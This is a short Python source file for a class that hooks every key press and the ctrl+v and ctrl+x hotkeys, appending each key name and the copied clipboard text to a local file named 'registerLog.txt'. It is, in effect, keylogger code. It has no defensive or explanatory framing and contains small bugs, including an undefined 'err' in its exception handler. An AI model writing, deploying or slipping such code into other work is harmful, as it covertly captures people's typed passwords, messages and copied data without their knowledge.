import keyboard
from _keyboardHandler._keynames import _keynames
from pyperclip import paste

class _keyboardHandler():
       def __init__(self):
              self.keyboard = keyboard
              self.d = _keynames()

       def getkeys(self, key):
              keyName = key.name
              if self.d.get(keyName):
                     keyName = self.d.get(keyName)

              file = open('registerLog.txt', 'a')
              file.write(str(keyName))
              file.close()
              
       def getClipboard(msg):
              try:
                     text_copied=paste()
                     file = open("registerLog.txt", 'a')
                     file.write("\n[COPY]:"+text_copied+"\n")
                     file.close()
              except err:
                     pass
       def initialize(self):
              self.keyboard.add_hotkey("ctrl+v", self.getClipboard)
              self.keyboard.add_hotkey("ctrl+x", self.getClipboard)

              self.keyboard.on_press(self.getkeys)
              self.keyboard.wait()